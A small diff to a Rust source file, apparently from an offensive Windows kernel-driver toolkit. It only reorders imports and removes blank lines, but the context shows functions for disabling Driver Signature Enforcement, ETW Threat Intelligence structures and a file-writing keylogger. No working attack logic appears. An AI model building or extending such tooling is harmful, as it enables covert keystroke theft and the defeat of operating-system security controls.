@@ -1,10 +1,10 @@
 use {
     log::*,
+    shared::structs::{DSE, ETWTI},
     crate::utils::{
         vk_to_char, update_key_state, key_pressed,
         get_process_by_name, open_driver,
     }, 
-    shared::structs::{DSE, ETWTI}, 
     std::{
         ffi::c_void, fs::OpenOptions, io::{BufWriter, Write}, 
         mem::size_of, ptr::null_mut, time::Duration 
@@ -21,7 +21,6 @@ use {
         },
     }
 };
-
 
 /// Key states.
 pub static mut KEY_STATE: [u8; 64] = [0; 64];
@@ -63,7 +62,6 @@ impl Misc {
             info!("Driver Signature Enforcement (DSE) {}", if enable { "enable" } else { "disable" });
         }
     }
-
 
     pub fn keylogger(self, ioctl_code: u32, file: &String) {
         unsafe {
